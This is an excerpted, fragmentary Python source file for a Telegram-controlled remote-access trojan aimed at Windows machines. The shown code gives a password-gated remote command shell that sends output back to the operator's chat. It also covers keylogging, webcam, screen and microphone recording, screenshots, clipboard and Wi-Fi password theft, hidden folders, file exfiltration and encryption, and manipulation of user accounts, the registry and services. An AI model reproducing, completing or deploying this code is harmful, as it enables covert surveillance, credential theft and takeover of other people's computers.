...
#-----
#------
TOKEN = 'HERE IS THE TOKEN FOR A SESSION WITH A TELEGRAM BOT'
...
def init():
    global TOKEN, PATH, PASSWORD, BOT_NAME, BOT_NAME_REG, BOT_PATH, RUN_KEY, SA_KEY
...
def setup_module(module, name, file_path, bot_client, chat_id, mode):
    if mode == '-e':
        with open(file_path, 'w') as module_status_file: 
            module_status_file.write('1')
            
        Thread(target=lambda: module(bot_client, chat_id), name=name).start()
    else: 
        with open(file_path, 'w') as module_status_file: 
            ...
            try: 
                if not error:
                    with open(rf'{PATH}\devices\__LOG__.bin', 'a+', encoding='utf-8') as log_bin: 
                        log_bin.write(
                            f'[{date_loger[0]}|{date_loger[-1]}]: ON --> {variable} = {value}\n' if 'enable' in status.lower(
        ...
        case 3: 
            try:
                ...
                bot_client.send_document(
                    chat_id, 
                    log_bin_data.encode(), 
                    visible_file_name='device_log.txt'
                ) if log_bin_data else bot_client.send_message(
                    chat_id, 
                    'Devices log is empty'
                )
            except BaseException as error:
                bot_client.send_message(chat_id, 
                    f'Why: An error occurred in device\nType: {type(error).__name__}\nDescription: {error}')        
        case _:
            match device_id:
                case 'DISK':
...
def systeminfo(ipconfig=False): 
    ...
    if not ipconfig:
        ...
        for _disk in run('wmic LOGICALDISK get deviceid,size,freespace,volumename'.split(), 
            ...
            try: 
                disk.append(f'Disk: {(_disk := _disk.split())[0][:-1]} | Memory: {int(_disk[2]) // 1024 // 
                    1024 // 1024} GB | Name: {"".join(_disk[3:])}')
            except: 
                continue
    ...
    try: 
        ip_route = findall(r'(\d+[.]\d+[.]\d+[.]\d+)', (_ip := run(
            'ipconfig', stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866')))[2::3]
    except: 
        ip_route = 'NOT FOUND'
    ...
    try: 
        route_mac_address = [_route_mac.upper() for _route_mac in findall(
            ...
            run('netsh wlan show interfaces'.split(), 
                stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866'))
        ]
    ...
    try:
        if (_interface := [interface.strip() for interface in findall(
            r'(\S.+)', 
            run('wmic NIC get NetConnectionID'.split(), 
                stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866'))][1:]
        ):
            for status in run('wmic NIC get NetEnabled'.split(), 
                stdout=PIPE, stderr=DEVNULL, shell=True).stdout.decode('cp866').split(
            )[1:]: 
                if status == 'TRUE':
    ...
    try: 
        adapter = list(set(
            [_adapter.strip() for _adapter in run('wmic NICCONFIG get Description'.split(), 
                stdout=PIPE, stderr=DEVNULL, shell=True
            ).stdout.decode('cp866').split('\n')[1:] if _adapter.strip()]
        ))
    except: 
...
def get_services():
    ...
    for service in findall(
        r'^\S+\s(\S?.+)\r', 
        all_services := cmd(run('sc query state= all'.split(), 
            stdout=PIPE, stderr=DEVNULL, shell=True).stdout), 
        flags=MULTILINE
    ):
...
def get_paths():
    ...
    for directories in [
        ...
        ('Users', r'C:\Users'), ('Windows', r'C:\Windows'), 
        ('Startup', 'wmic STARTUP get Command')
    ]: 
        go_to_directory(directories[0], directories[-1], 
                        mode=0 if directories[0] != 'Startup' else 1)
    
    return paths


def block_app(bot_client=None, chat_id=None, mode=1):
    if mode == 1:
        try: 
            bot_client.send_message(chat_id, 'Blocker app module is started')
        except: ...
        ...
        try:
            with open(rf'{PATH}\config\F737-831C-210B-48D6-8208-065E-CEB8-E919', 'r') as module_status_file: 
                if module_status_file.read().strip() == '0': 
                    if mode == 1:  
                        try: 
                            bot_client.send_message(chat_id, 'Blocker app module is disabled')
                        except: ...
...
def keylogger(bot_client=None, chat_id=None, mode=1):
    ...
    if mode == 1:  
        try: 
            bot_client.send_message(chat_id, 'Keylogger module is started')
        except: ...
        ...
        try:
            with open(rf'{PATH}\config\C011-1592-C58D-4C45-B7D2-6617-6DDB-5D59', 'r') as module_status_file: 
                if module_status_file.read().strip() == '0':
                    if mode == 1:    
                        try: 
                            bot_client.send_message(chat_id, 'Keylogger module is disabled')
                        except: ...
...
def play(second, mode, bot_client=None, chat_id=None):
    match mode:
        case 0:
            audio = PyAudio()
        ...
        case _:
            ...
            if webcam.isOpened():
                ...
                video = VideoWriter(rf'{PATH}\file\2328-6639-9EAA-AB39-D099-56B2-9C94-EFEF.mp4', VideoWriter_fourcc(*'mp4v'), 
                                    20, (1280, 720))
                ...
                bot_client.send_message(chat_id, 'Webcam recording is not taken')
...
def bot(bot_client):
    ...
    session = f'Author: Vladislav Khudash\n\nNode: {_node}\nPlatform: {_platform} {_release} {_edition}\nDate: {date_bot[0]} | {date_bot[-1]}'


    @bot_client.message_handler(content_types=['document'])
    def upload(file):
        try: 
            if exists(rf'{PATH}\config\{file.from_user.id}'):
                with open(rf'{PATH}\tools\{file.document.file_name}', 'wb') as upload_file: 
            ...
            bot_client.send_message(file.chat.id, 
                f'Why: An error occurred in upload\nType: {type(error).__name__}\nDescription: {error}')        
    ...
    def executor(message):
        try:
            for folder_path in [
                ...
                try:
                    if not exists(folder_path): 
                        mkdir(folder_path)
                        run(f'attrib +h +s +r {folder_path}'.split(), 
                            stdout=DEVNULL, stderr=DEVNULL, shell=True)
                except: 
                    continue  
            ...
            if not exists(rf'{PATH}\config\{user_id}'):  
                if not exists(rf'{PATH}\config\{user_id}') and command == PASSWORD:          
                    with open(rf'{PATH}\config\{user_id}', 'w') as account_data_file: 
                ...
                def cmd_tool(cmd_command, error, name):
                    result_cmd = run(cmd_command.split(), 
                        stdout=PIPE, stderr=PIPE, input=False, shell=True)
                    ...
                    bot_client.send_document(chat_id, 
                        stdout.strip().encode() if stdout else stderr.strip().encode(), visible_file_name=name)  
                ...
                try: 
                    ...
                    if exists(unhide_path): 
                        run(f'attrib -h -s -r "{unhide_path}"', 
                            stdout=DEVNULL, stderr=DEVNULL, shell=True)
                    else: 
                ...
                try:
                    ...
                    with open(download_path, 'rb') as download_file: 
                        bot_client.send_document(chat_id, download_file, visible_file_name=download_path.split('\\')[-1])
                ...
                try:
                    ...
                    cmd_tool(f'netsh {netsh}', 'netsh.txt', f'The {netsh} command was not found.')
                ...
                try:
                    ...
                    match network:
                        case '-s': 
                            bot_client.send_document(chat_id, wifi().encode(), visible_file_name='wifi.txt') 
                        case '-p': 
                            bot_client.send_document(
                                chat_id, 
                                tabulate(wifi_password, headers=[('SSID'), ('PASSWORD')], tablefmt='pipe').encode(
                                    ) if (wifi_password := get_wifi_password()
                                    ) else 'NOT FOUND'.encode(
                                ), 
                                visible_file_name='wifi_password.txt'
                            ) 
                        case '-c': 
                            run('ipconfig /renew'.split(),
                                stdout=DEVNULL, stderr=DEVNULL, shell=True)
                        case _: 
                            run('ipconfig /release'.split(), 
                                stdout=DEVNULL, stderr=DEVNULL, shell=True)
                ...
                try: 
                    ...
                    cmd_tool(f'reg {reg}', 'reg.txt',
                        f'Error. Invalid argument or parameter \'{reg}\'.\nEnter "REG /?" for information on use.')
                ...
                try:
                    ...
                    cmd_tool(f'sc {sc}', 'sc.txt', 'The specified service is not installed.')
                ...
                try:
                    ...
                    cmd_tool(f'schtasks {schtasks}', 'schtasks.txt',
                ...
                try:
                    ...
                    cmd_tool(f'secedit {secedit}', 'secedit.txt',
                        'For all filenames, this is the actual directory unless a different path is specified.')                       
                ...
                try:
                    ...
                    cmd_tool(f'wmic {wmic}', 'wmic.txt', f'{wmic} - alias not found.')           
                ...
                try:
                    ...
                    cmd_tool(f'winmgmt {winmgmt}', 'winmgmt.txt', 'Invalid parameter')
                ...
                try:
                    ...
                    if user == '/?': 
                        bot_client.send_document(
                            chat_id, 
                            cmd(run('net USER /?'.split(), 
                                stdout=PIPE, stderr=PIPE, input=False, shell=True).stderr).strip().encode(), 
                            visible_file_name='user.txt'
                        )
                    else: 
                        if user == 'show':
                            cmd_tool('net USER', 'user.txt', 'The command completed with one or more errors.') 
                        else: 
                            cmd_tool(f'net USER {user}', 'user.txt', 'The command completed with one or more errors.')
                ...
                try:
                    ...
                    if cmd_command[0].strip() == '-e': 
                        run(cmd_command[1].strip(), 
                            stdout=DEVNULL, stderr=DEVNULL, input=False, shell=True)
                    else:
                        result_cmd_command = run(cmd_command[1].strip(), 
                            stdout=PIPE, stderr=PIPE, input=False, shell=True)   

                        stdout = cmd(result_cmd_command.stdout)
                        stderr = cmd(result_cmd_command.stderr) 
                        ...
                        bot_client.send_document(chat_id, 
                            stdout.encode() if stdout else stderr.encode(), visible_file_name='cmd.txt') 
                ...
                try:
                    ...
                    if _keylogger == '-g':
                        with open(rf'{PATH}\config\0A46-2C5D-67F8-DA81-CB53-EE16-7F79-4A7V', 'r', encoding='utf-8') as keylogger_requirement: 
                            bot_client.send_document(chat_id, keylogger_requirement, 
                                                     visible_file_name='keylogger.txt')
                    else: 
                ...
                if 'module' in command:
                    ...
                    try:
                        ...
                        for account_file in glob(rf'{PATH}\config\*'):
                            try: 
                        ...
                        bot_client.send_document(
                            ...
                            visible_file_name='accounts.txt'
                        )
                    ...
                    try: 
                        ...
                        remove(rf'{PATH}\config\{account_id}')

                        if not exists(rf'{PATH}\config\{account_id}'):
                    ...
                    try:
                        ...
                        if sites_blocked == '-l':
                            ...
                            if not sites_blocked:
                                bot_client.send_message(chat_id, 'No blocked websites') 
                            else:
                                bot_client.send_document(
                                    chat_id, 
                                    tabulate(
                                    ...
                                    visible_file_name='blocked_websites.txt'
                                )  
                        else: 
                    ...
                    try:
                        ...
                        match device_mode:
                            ...
                            case '-r': 
                                device(mode=1)
                            case '-g': 
                                device(bot_client=bot_client, chat_id=chat_id, mode=3)
                            case '-l':
                    ...
                    try:
                        ...
                        if (buffer_data := buffer_get()):
                            bot_client.send_document(chat_id, buffer_data.encode(), visible_file_name='buffer.txt') 
                        else: 
                    ...
                    try:
                        ...
                        bot_client.send_document(chat_id, apps().encode(), visible_file_name='apps.txt')
                        ...
                        if '-e' in app_mode:
                            if app_mode == '-l -e':
                                ...
                                if not app_name and not app_added_time and not path_apps:
                                    bot_client.send_message(chat_id, 'No bot startup apps')  
                                else: 
                                    bot_client.send_document(
                                        chat_id, 
                                        ...
                                        visible_file_name='bot_startup.txt'
                                    )
                            else:
                                with open(rf'{PATH}\config\D566-D7D7-DCD6-471C-8109-BE0A-D331-99E3', 'w') as startup_apps: ...
                        else:
                            if app_mode == '-l -b':
                                ...
                                if not app_blocked and not app_time_blocked:
                                    bot_client.send_message(chat_id, 'No blocked apps') 
                                else: 
                                    bot_client.send_document(
                                        chat_id, 
                                        ...
                                        visible_file_name='blocked_apps.txt'
                                    )  
                            else:
                                with open(rf'{PATH}\config\1AB5-DB30-65FD-D32A-505A-B6B0-D32E-7VG2', 'w', encoding='utf-8') as app_requirement: ...               
                    ...
                    try:
                        ...
                        match play_seconds[0].strip():
                            ...
                            case _: 
                                play(abs(int(play_seconds[1].strip())), 2, bot_client, chat_id)  
                        ...
                        match play_get:
                            case '-a':
                                with open(rf'{PATH}\file\V7FB-FAAE-A543-42CE-AF39-CFAC8-449-EE1E.mp3', 'rb') as sound_mp3: 
                                    bot_client.send_document(chat_id, 
                                        sound_mp3, visible_file_name='sound.mp3') 
                            ...
                            case '-v':
                                with open(rf'{PATH}\file\49AD-4DD3-22FF-170E-F83E-21AF-4EEB-92B5.mp4', 'rb') as screen_recording_mp4: 
                                    bot_client.send_document(chat_id, 
                                        screen_recording_mp4, visible_file_name='screen_recording.mp4') 
                            ...
                            case _:
                                with open(rf'{PATH}\file\2328-6639-9EAA-AB39-D099-56B2-9C94-EFEF.mp4', 'rb') as webcam_recording_mp4: 
                                    bot_client.send_document(chat_id, 
                                        webcam_recording_mp4, visible_file_name='webcam_recording.mp4') 
                    ...
                    try: 
                        ...
                        bot_client.send_message(chat_id, 
                            f'Current mouse cursor position: {(mouse_position := pygui.position()).x}x{mouse_position.y}')
                    ...
                    try:
                        ...
                        pygui.press(keyboard_key['key'].strip(), presses=abs(int(keyboard_key['presses'].strip())), 
                            interval=abs(float(keyboard_key['interval'].strip())))
...
'''.strip().encode(), visible_file_name='help.txt'
                        )      
...
'''.strip()    
                    ...
                    case 'getuid': 
                        ...
                        return
                    case 'getpid': 
                        bot_client.send_message(chat_id, f'Current pid: {getpid()}')

                        return
                    case 'exit':
                        try: 
                            del_file(rf'{PATH}\config\{user_id}')
                        except: 
                        ...
                        return
                    case 'pwd': 
                        bot_client.send_message(chat_id, getcwd()) 
     
                        return
                    case 'cd': 
                        bot_client.send_message(chat_id, 'cd path  -  Change current directory')                           
                        ...
                        bot_client.send_document(
                            ...
                            (f'/{"-":-^50}<UNHIDDEN>{"-":-^50}\\\n' + 
                                ...
                                cmd(run('dir /Q /A:H'.split(), 
                                    stdout=PIPE, stderr=DEVNULL, shell=True).stdout).strip()).encode(),
                            visible_file_name='ls.txt'
                        )

                        return 
                    case 'hide': 
                        bot_client.send_message(chat_id, 'hide path  -  Hide folder or file at this path')
        
                        return 
                    case 'unhide': 
                        bot_client.send_message(chat_id, 'unhide path  -  Unhide folder or file at this path')

                        return         
                    case 'mkdir': 
                        bot_client.send_message(chat_id, 'mkdir path  -  Create folder at this path')  

                        return 
                    case 'mkfile': 
                        bot_client.send_message(chat_id, 'mkfile path -c content  -  Create file at this path')   
       
                        return  
                    case 'rn': 
                        bot_client.send_message(chat_id, 'rn path -t new name  -  Rename folder or file at this path')   
      
                        return  
                    case 'rmdir': 
                        bot_client.send_message(chat_id, 'rmdir path  -  Delete folder at this path')  
        
                        return 
                    case 'rm': 
                        bot_client.send_message(chat_id, 'rm path  -  Delete file at this path')  
     
                        return 
                    case 'cp': 
                        bot_client.send_message(chat_id, 'cp path from -t path to  -  Copy folder or file to this path') 
   
                        return 
                    case 'mv': 
                        bot_client.send_message(chat_id, 'mv path from -t path to  -  Move folder or file to this path')
      
                        return    
                    case 'download': 
                        bot_client.send_message(chat_id, 'download path  -  Download file from this path')   
                    ...
                    case 'upload': 
                        ...
                        return 
                    case 'encrypt': 
                        bot_client.send_message(chat_id, 'encrypt path -p password  -  Encrypt file at this path')  
     
                        return 
                    case 'decrypt':  
                        bot_client.send_message(chat_id, 'decrypt path -p password  -  Decrypt file at this path')  
                             
                        return 
                    case 'netsh': 
                        bot_client.send_message(chat_id, 'Changing or interacting with netsh')  
...
'''.strip()    
                    ...
                    case 'ipconfig': 
                        bot_client.send_document(chat_id, 
                            systeminfo(ipconfig=True).encode(), visible_file_name='ipconfig.txt')        
                        
                        return 
                    case 'route': 
                        bot_client.send_document(
                            chat_id, 
                            cmd(run('route PRINT'.split(), 
                                stdout=PIPE, stderr=DEVNULL, shell=True).stdout).strip().encode(), 
                            visible_file_name='route.txt'
                        ) 
                    ...
                    case 'netstat': 
                        bot_client.send_document(
                            ...
                            tabulate(
                                ...
                                tablefmt='pipe').encode(
                                ) if (_connection_list := findall(r'(TCP|UDP)\s+(\S+)[:](\S+)\s+(\S+)[:](\S+)\s+(\S+)', _netstat := cmd(
                                    run('netstat -a'.split(), stdout=PIPE, stderr=DEVNULL, shell=True).stdout))
                                ) else _netstat.strip().encode(), 
                            visible_file_name='netstat.txt'
                        )
...
'''.strip()
                    ...
                    case 'systeminfo': 
                        bot_client.send_document(chat_id, 
                            systeminfo().encode(), visible_file_name='systeminfo.txt')
                    ...
                    case 'services': 
                        bot_client.send_document(
                            ...
                            tabulate(
                                ...
                                tablefmt='pipe'
                            ).encode() if (services := get_services()
                                     ) else cmd(run('sc query state= all'.split(), 
                                                    stdout=PIPE, stderr=DEVNULL, shell=True).stdout
                            ).strip().encode(), 
                            visible_file_name='services.txt'
                        )
                            ...
                            tabulate(
                                ...
                                tablefmt='pipe').encode(
                                    ...
                                    _task_list := [_task.replace('"', '').split(',') for _task in cmd(run(
                                        'schtasks /query /nh /fo csv'.split(), stdout=PIPE, stderr=DEVNULL, shell=True).stdout
                                    ).split('\n')]
                                )[0][0] else cmd(
                                    run('schtasks /query'.split(), 
                                        stdout=PIPE, stderr=DEVNULL, shell=True).stdout
                            ).strip().encode(), 
                            visible_file_name='tasks.txt'
                        ) 
                        ...
                        bot_client.send_document(
                            ...
                            tabulate(
                                ...
                                tablefmt='pipe').encode(
                                        ...
                                        apps_startup := [_startup.split(',')[1:] for _startup in [_startup_.strip() for _startup_ in cmd(run(
                                            'wmic STARTUP get Caption,Command,Location,User /format:csv'.split(), 
                                            stdout=PIPE, stderr=DEVNULL, shell=True
                                        ).stdout).split('\n') if _startup_.strip()][1:]]
                                    ) else cmd(run('wmic STARTUP get Caption,Command,Location,User /format:table'.split(), 
                                            stdout=PIPE, stderr=DEVNULL, shell=True).stdout
                            ).strip().encode(), 
                            visible_file_name='startup.txt'
                        )
      
                        return
                    case 'paths': 
                        bot_client.send_document(chat_id, 
                            get_paths().encode(), visible_file_name='paths.txt')
...
'''.strip()
                    ...
                    case 'ps': 
                        bot_client.send_document(
                            ...
                            tabulate(
                                ...
                                tablefmt='pipe').encode(
                                    ) if (_process_list := [_process.replace('"', '').split(',') for _process in cmd(
                                        run('tasklist /v /nh /fo csv'.split(), 
                                            stdout=PIPE, stderr=DEVNULL, shell=True).stdout).split('\n')]
                                    )[0][0] else cmd(run('tasklist /v'.split(), 
                                                         stdout=PIPE, stderr=DEVNULL, shell=True).stdout
                            ).strip().encode(), 
                            visible_file_name='ps.txt'
                        )
          
                        return 
                    case 'kill': 
                        bot_client.send_message(chat_id, 'kill -p pid  -  Kill process by pid\n\nkill -n name  -  Kill process by name')
                    ...
                    case 'cmd': 
                        ...
                        return  
                    case 'reg': 
                        bot_client.send_message(chat_id, 'Changing or interacting with register')
         
                        return 
                    case 'sc': 
                        bot_client.send_message(chat_id, 'Changing or interacting with services')
       
                        return 
                    case 'schtasks': 
                        bot_client.send_message(chat_id, 'Changing or interacting with schtasks')
        
                        return 
                    case 'secedit': 
                        bot_client.send_message(chat_id, 'Changing or interacting with secedit')  

                        return 
                    case 'wmic': 
                        bot_client.send_message(chat_id, 'Changing or interacting with wmic')  
           
                        return 
                    case 'winmgmt': 
                        bot_client.send_message(chat_id, 'Changing or interacting with winmgmt')
       
                        return 
                    case 'user': 
                        bot_client.send_message(chat_id, 'Changing or interacting with accounts on this computer') 

                        return  
                    case 'time':
                        bot_client.send_message(chat_id, 
                            'time -g  -  Get current time\n\ntime -c new time  -  Change current time')
       
                        return
                    case 'date':
                        bot_client.send_message(chat_id, 
                            'date -g  -  Get current date\n\ndate -c new date  -  Change current date')
                    ...
                    case 'screenshot': 
                        if (screenshot_data := screenshot()):
                            bot_client.send_document(chat_id, 
                                screenshot_data, visible_file_name='screenshot.png')  
                        else: 
                            bot_client.send_message(chat_id, 'Screenshot not taken')
                    ...
                    case 'screenshot_webcam':
                        if (screenshot_webcam_data := screenshot_webcam()):
                            bot_client.send_document(chat_id, 
                                screenshot_webcam_data, visible_file_name='screenshot_webcam.png')  
                        else: 
                            bot_client.send_message(chat_id, 'Webcam screenshot not taken')
...
'''.strip()
                        ...
                        return 
                    case _: 
                        bot_client.send_message(chat_id, f'Command not found --> {command}')
...
def agent(bot_client=None, chat_id=None, mode=1): 
...
'''.strip())
    ...
    if mode == 1:
        try: 
            bot_client.send_message(chat_id, 'Agent module is started')
        except: ...
        ...
        try:
            with open(rf'{PATH}\config\D3S7-C504-B97D-4CBE-BEB9-83DC-C1B6-4V61', 'r') as module_status_file: 
                if module_status_file.read().strip() == '0': 
                    if mode == 1:  
                        try: 
                            bot_client.send_message(chat_id, 'Agent module is disabled')
                        except: ...
